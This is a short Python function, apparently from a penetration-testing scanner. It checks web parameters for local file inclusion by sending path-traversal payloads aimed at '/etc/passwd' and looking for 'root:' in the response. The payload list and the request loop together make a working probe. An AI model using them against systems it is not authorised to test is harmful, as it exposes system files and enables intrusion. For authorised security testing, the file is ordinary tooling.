import requests
from termcolor import colored

LFI_PAYLOADS = [
    '../../../../etc/passwd',
    '....//....//etc/passwd',
    '%2e%2e%2fetc%2fpasswd'
]

def test_lfi(args):
    params = args.params.split(',')
    method = args.method.lower()
    
    for param in params:
        for payload in LFI_PAYLOADS:
            try:
                data = {param: payload} if method == 'post' else None
                params_dict = {param: payload} if method == 'get' else None
                
                response = requests.request(
                    method,
                    args.url,
                    params=params_dict,
                    data=data
                )
                
                if 'root:' in response.text:
                    print(colored(f"[+] LFI vulnerability found in parameter: {param}", 'green'))
                    print(colored(f"Payload: {payload}", 'yellow'))
                    return
            except Exception as e:
                continue
    print(colored("[-] No LFI vulnerabilities found", 'red'))
